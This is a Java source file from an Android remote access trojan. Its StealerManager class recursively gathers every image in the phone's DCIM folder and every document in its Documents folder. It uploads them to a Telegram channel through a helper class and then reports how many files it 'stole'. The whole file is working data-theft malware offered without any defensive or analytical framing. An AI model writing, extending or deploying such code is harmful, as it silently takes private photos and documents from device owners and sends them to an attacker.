package com.enterprise.rat.commands;

import android.content.Context;
import android.os.Environment;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;

public class StealerManager {
    public static void stealImages(Context context) {
        new Thread(() -> {
            File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            int count = uploadRecursive(dcim, ".jpg|.jpeg|.png|.gif|.webp");
            TelegramApi.sendMessage("📸 Stole " + count + " images.");
        }).start();
    }

    public static void stealDocuments(Context context) {
        new Thread(() -> {
            File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
            int count = uploadRecursive(docs, ".pdf|.doc|.docx|.xls|.xlsx|.txt");
            TelegramApi.sendMessage("📄 Stole " + count + " documents.");
        }).start();
    }

    private static int uploadRecursive(File dir, String extensions) {
        if (!dir.exists()) return 0;
        int count = 0;
        File[] files = dir.listFiles();
        if (files != null) for (File f : files) {
            if (f.isDirectory()) count += uploadRecursive(f, extensions);
            else { String name = f.getName().toLowerCase();
                for (String ext : extensions.split("\\|")) if (name.endsWith(ext)) {
                    TelegramApi.sendFile(f, f.getName());
                    count++;
                    break;
                }
            }
        }
        return count;
    }
}
